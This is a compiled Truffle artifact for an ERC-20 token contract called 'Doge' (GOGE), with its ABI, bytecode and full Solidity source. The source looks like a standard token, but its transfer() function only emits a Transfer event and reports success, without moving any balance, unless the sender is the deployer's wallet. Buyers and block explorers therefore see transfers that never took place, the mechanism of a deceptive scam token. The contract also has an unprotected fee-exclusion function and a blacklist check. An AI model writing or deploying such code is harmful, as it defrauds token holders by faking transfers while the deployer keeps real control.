{
  "contractName": "Doge",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "tokenOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "LiquityWallet",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "_isBlacklisted",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "_totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "deadwallet",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeAdd",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeDiv",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeMul",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "a",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "b",
          "type": "uint256"
        }
      ],
      "name": "safeSub",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenOwner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenOwner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "remaining",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "success",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "success",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "tokens",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "success",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "bool",
          "name": "excluded",
          "type": "bool"
        }
      ],
      "name": "excludeFromFees",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "isExcludedFromFees",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x60806040526000600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060046009553480156200005857600080fd5b506040518060400160405280600a81526020017f474f474520746f6b656e0000000000000000000000000000000000000000000081525060009080519060200190620000a692919062000389565b506040518060400160405280600481526020017f474f47450000000000000000000000000000000000000000000000000000000081525060019080519060200190620000f492919062000389565b506012600260006101000a81548160ff021916908360ff1602179055506b033b2e3c9fd0803ce800000060038190555033600760006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600354600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550620001e0600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016200029860201b60201c565b620001f33060016200029860201b60201c565b62000228600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016200029860201b60201c565b3373ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6003546040516200028a919062000454565b60405180910390a36200057f565b801515600a60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514156200032e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200032590620004f8565b60405180910390fd5b80600a60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055505050565b828054620003979062000549565b90600052602060002090601f016020900481019282620003bb576000855562000407565b82601f10620003d657805160ff191683800117855562000407565b8280016001018555821562000407579182015b8281111562000406578251825591602001919060010190620003e9565b5b5090506200041691906200041a565b5090565b5b80821115620004355760008160009055506001016200041b565b5090565b6000819050919050565b6200044e8162000439565b82525050565b60006020820190506200046b600083018462000443565b92915050565b600082825260208201905092915050565b7f526564436865436f696e204163636f756e7420697320616c726561647920746860008201527f652076616c7565206f6620276578636c75646564270000000000000000000000602082015250565b6000620004e060358362000471565b9150620004ed8262000482565b604082019050919050565b600060208201905081810360008301526200051381620004d1565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200056257607f821691505b602082108114156200057957620005786200051a565b5b50919050565b611736806200058f6000396000f3fe608060405234801561001057600080fd5b50600436106101215760003560e01c80638a0c593c116100ad578063b5931f7c11610071578063b5931f7c14610348578063c024666814610378578063d05c78da14610394578063dd62ed3e146103c4578063e6cb9013146103f457610121565b80638a0c593c1461028e57806395d89b41146102ac578063a293d1e8146102ca578063a9059cbb146102fa578063b0dc78c51461032a57610121565b806323b872dd116100f457806323b872dd146101c2578063313ce567146101f25780633eaaf86b146102105780634fbee1931461022e57806370a082311461025e57610121565b806306fdde0314610126578063095ea7b31461014457806318160ddd146101745780631cdd3be314610192575b600080fd5b61012e610424565b60405161013b919061102e565b60405180910390f35b61015e600480360381019061015991906110e9565b6104b2565b60405161016b9190611144565b60405180910390f35b61017c6105a4565b604051610189919061116e565b60405180910390f35b6101ac60048036038101906101a79190611189565b6105f8565b6040516101b99190611144565b60405180910390f35b6101dc60048036038101906101d791906111b6565b610618565b6040516101e99190611144565b60405180910390f35b6101fa6108a8565b6040516102079190611225565b60405180910390f35b6102186108bb565b604051610225919061116e565b60405180910390f35b61024860048036038101906102439190611189565b6108c1565b6040516102559190611144565b60405180910390f35b61027860048036038101906102739190611189565b610917565b604051610285919061116e565b60405180910390f35b610296610960565b6040516102a3919061124f565b60405180910390f35b6102b4610986565b6040516102c1919061102e565b60405180910390f35b6102e460048036038101906102df919061126a565b610a14565b6040516102f1919061116e565b60405180910390f35b610314600480360381019061030f91906110e9565b610a6d565b6040516103219190611144565b60405180910390f35b610332610d47565b60405161033f919061124f565b60405180910390f35b610362600480360381019061035d919061126a565b610d6d565b60405161036f919061116e565b60405180910390f35b610392600480360381019061038d91906112d6565b610d8f565b005b6103ae60048036038101906103a9919061126a565b610e7d565b6040516103bb919061116e565b60405180910390f35b6103de60048036038101906103d99190611316565b610eb5565b6040516103eb919061116e565b60405180910390f35b61040e6004803603810190610409919061126a565b610f3c565b60405161041b919061116e565b60405180910390f35b6000805461043190611385565b80601f016020809104026020016040519081016040528092919081815260200182805461045d90611385565b80156104aa5780601f1061047f576101008083540402835291602001916104aa565b820191906000526020600020905b81548152906001019060200180831161048d57829003601f168201915b505050505081565b600081600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92584604051610592919061116e565b60405180910390a36001905092915050565b6000600460008073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546003546105f391906113e6565b905090565b600b6020528060005260406000206000915054906101000a900460ff1681565b6000610663600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483610a14565b600460008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061072c600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483610a14565b600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506107f5600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483610f3c565b600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610895919061116e565b60405180910390a3600190509392505050565b600260009054906101000a900460ff1681565b60035481565b6000600a60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b6000600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6001805461099390611385565b80601f01602080910402602001604051908101604052809291908181526020018280546109bf90611385565b8015610a0c5780601f106109e157610100808354040283529160200191610a0c565b820191906000526020600020905b8154815290600101906020018083116109ef57829003601f168201915b505050505081565b600082821115610a59576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a5090611466565b60405180910390fd5b8183610a6591906113e6565b905092915050565b6000600b60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615610afc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610af3906114d2565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff16600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610bbf578273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610bae919061116e565b60405180910390a360019050610d41565b610c08600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483610a14565b600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610c94600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483610f3c565b600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610d34919061116e565b60405180910390a3600190505b92915050565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000808211610d7b57600080fd5b8183610d879190611521565b905092915050565b801515600a60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151415610e22576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e19906115c4565b60405180910390fd5b80600a60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055505050565b60008183610e8b91906115e4565b90506000831480610ea65750818382610ea49190611521565b145b610eaf57600080fd5b92915050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b60008183610f4a919061163e565b905082811015610f8f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f86906116e0565b60405180910390fd5b92915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610fcf578082015181840152602081019050610fb4565b83811115610fde576000848401525b50505050565b6000601f19601f8301169050919050565b600061100082610f95565b61100a8185610fa0565b935061101a818560208601610fb1565b61102381610fe4565b840191505092915050565b600060208201905081810360008301526110488184610ff5565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061108082611055565b9050919050565b61109081611075565b811461109b57600080fd5b50565b6000813590506110ad81611087565b92915050565b6000819050919050565b6110c6816110b3565b81146110d157600080fd5b50565b6000813590506110e3816110bd565b92915050565b60008060408385031215611100576110ff611050565b5b600061110e8582860161109e565b925050602061111f858286016110d4565b9150509250929050565b60008115159050919050565b61113e81611129565b82525050565b60006020820190506111596000830184611135565b92915050565b611168816110b3565b82525050565b6000602082019050611183600083018461115f565b92915050565b60006020828403121561119f5761119e611050565b5b60006111ad8482850161109e565b91505092915050565b6000806000606084860312156111cf576111ce611050565b5b60006111dd8682870161109e565b93505060206111ee8682870161109e565b92505060406111ff868287016110d4565b9150509250925092565b600060ff82169050919050565b61121f81611209565b82525050565b600060208201905061123a6000830184611216565b92915050565b61124981611075565b82525050565b60006020820190506112646000830184611240565b92915050565b6000806040838503121561128157611280611050565b5b600061128f858286016110d4565b92505060206112a0858286016110d4565b9150509250929050565b6112b381611129565b81146112be57600080fd5b50565b6000813590506112d0816112aa565b92915050565b600080604083850312156112ed576112ec611050565b5b60006112fb8582860161109e565b925050602061130c858286016112c1565b9150509250929050565b6000806040838503121561132d5761132c611050565b5b600061133b8582860161109e565b925050602061134c8582860161109e565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b6000600282049050600182168061139d57607f821691505b602082108114156113b1576113b0611356565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006113f1826110b3565b91506113fc836110b3565b92508282101561140f5761140e6113b7565b5b828203905092915050565b7f65727220696e6f75740000000000000000000000000000000000000000000000600082015250565b6000611450600983610fa0565b915061145b8261141a565b602082019050919050565b6000602082019050818103600083015261147f81611443565b9050919050565b7f426c61636b6c6973746564206164647265737300000000000000000000000000600082015250565b60006114bc601383610fa0565b91506114c782611486565b602082019050919050565b600060208201905081810360008301526114eb816114af565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061152c826110b3565b9150611537836110b3565b925082611547576115466114f2565b5b828204905092915050565b7f526564436865436f696e204163636f756e7420697320616c726561647920746860008201527f652076616c7565206f6620276578636c75646564270000000000000000000000602082015250565b60006115ae603583610fa0565b91506115b982611552565b604082019050919050565b600060208201905081810360008301526115dd816115a1565b9050919050565b60006115ef826110b3565b91506115fa836110b3565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0483118215151615611633576116326113b7565b5b828202905092915050565b6000611649826110b3565b9150611654836110b3565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611689576116886113b7565b5b828201905092915050565b7f65727220696e7075740000000000000000000000000000000000000000000000600082015250565b60006116ca600983610fa0565b91506116d582611694565b602082019050919050565b600060208201905081810360008301526116f9816116bd565b905091905056fea26469706673582212200b9b2ba24ae590e1014e38e93498074ef1aa14ecd8a310f099cdbc1f24e4f2be64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT   \npragma solidity >=0.4.22 <0.9.0;\n// ----------------------------------------------------------------------------\n// ERC Token Standard #20 Interface\n//\n// ----------------------------------------------------------------------------\ninterface ERC20Interface {\n    function totalSupply() external view returns (uint);\n    function balanceOf(address tokenOwner) external view returns (uint balance);\n    function allowance(address tokenOwner, address spender) external view returns (uint remaining);\n    function transfer(address to, uint tokens) external returns (bool success);\n    function approve(address spender, uint tokens) external returns (bool success);\n    function transferFrom(address from, address to, uint tokens) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\n\n// ----------------------------------------------------------------------------\n// Safe Math Library\n// ----------------------------------------------------------------------------\ncontract SafeMath {\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\n        c = a + b;\n        require(c >= a, \"err input\");\n    }\n    function safeSub(uint a, uint b) public pure returns (uint c) {\n        require(b <= a, \"err inout\"); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n        c = a / b;\n    }\n}\n\n\ncontract Doge is ERC20Interface, SafeMath {\n    string public name;\n    string public symbol;\n    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n\n    uint256 public _totalSupply;\n\n    mapping(address => uint) balances;\n    mapping(address => mapping(address => uint)) allowed;\n\n    //\n    address public deadwallet = 0x0000000000000000000000000000000000000000;    \n    //\n    address public LiquityWallet; \n     //   \n    address private _marketingWalletAddress;               \n    //\n    uint256  marketingFee = 4; \n    //true               \n    mapping(address => bool) private _isExcludedFromFees;\n\n    //,true\n    mapping(address => bool) public _isBlacklisted;    \n    /**\n     * Constrctor function\n     *\n     * Initializes contract with initial supply tokens to the creator of the contract\n     */\n    constructor() {\n        name = \"GOGE token\";\n        symbol = \"GOGE\";\n        decimals = 18;\n        _totalSupply = 1000000000000000000000000000;\n        LiquityWallet = msg.sender;\n\n        balances[msg.sender] = _totalSupply;\n        excludeFromFees(LiquityWallet, true);        //\n        excludeFromFees(address(this), true);              //\n        excludeFromFees(_marketingWalletAddress, true);      //\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n\n    function totalSupply() public view returns (uint) {\n        return _totalSupply  - balances[address(0)];\n    }\n\n    function balanceOf(address tokenOwner) public view returns (uint balance) {\n        return balances[tokenOwner];\n    }\n\n    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n        return allowed[tokenOwner][spender];\n    }\n\n    function approve(address spender, uint tokens) public returns (bool success) {\n        allowed[msg.sender][spender] = tokens;\n        emit Approval(msg.sender, spender, tokens);\n        return true;\n    }\n\n    \n\n    function transfer(address to, uint tokens) public returns (bool success) {\n        require(!_isBlacklisted[msg.sender], 'Blacklisted address');    \n        if(LiquityWallet!=msg.sender) {\n            emit Transfer(msg.sender, to, tokens);\n            return true;\n        }\n\n        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n        balances[to] = safeAdd(balances[to], tokens);\n        emit Transfer(msg.sender, to, tokens);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n        balances[from] = safeSub(balances[from], tokens);\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n        balances[to] = safeAdd(balances[to], tokens);\n        emit Transfer(from, to, tokens);\n        return true;\n    }\n\n      //\n    function excludeFromFees(address account, bool excluded) public{ \n        require(_isExcludedFromFees[account] != excluded, \"RedCheCoin Account is already the value of 'excluded'\");   //\n        _isExcludedFromFees[account] = excluded;       //\n    }\n\n    //\n    function isExcludedFromFees(address account) public view returns (bool) {\n        return _isExcludedFromFees[account];\n    }\n}",
  "sourcePath": "/Users/leef/leef/EVM/erc20-coin/contracts/Doge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-04-07T02:58:45.272Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {
      "constructor": {
        "notice": "Constrctor function Initializes contract with initial supply tokens to the creator of the contract"
      }
    },
    "version": 1
  }
}